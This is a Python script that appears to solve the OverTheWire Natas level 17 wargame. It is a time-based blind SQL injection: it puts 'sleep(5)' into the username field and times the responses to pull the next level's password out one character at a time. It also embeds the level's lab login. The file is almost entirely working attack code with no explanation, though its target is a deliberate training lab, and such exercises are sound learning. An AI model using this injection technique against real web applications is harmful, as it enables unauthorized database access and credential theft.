import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'
key=''
select = 'agknoquvwx468DEFGJLNPQUVZ'

# for char in chars:
#     data = {'username': 'natas18" and password like binary "%'+char+'%" and sleep(5) #' }
#     r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", data=data, auth=HTTPBasicAuth("natas17","XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"))
#     #print(r.text)
#     print(r.elapsed.seconds)
#     if r.elapsed.seconds > 2:
#         select = select+char
#         print(select)


for i in range(0,32):
    for char in select:
        data = {'username':'natas18" and password like binary "'+key+char+'%" and sleep(5) #'}
        r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", data=data, auth=HTTPBasicAuth("natas17","XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"))
        if r.elapsed.seconds >2:
            key = key + char
            print(key)

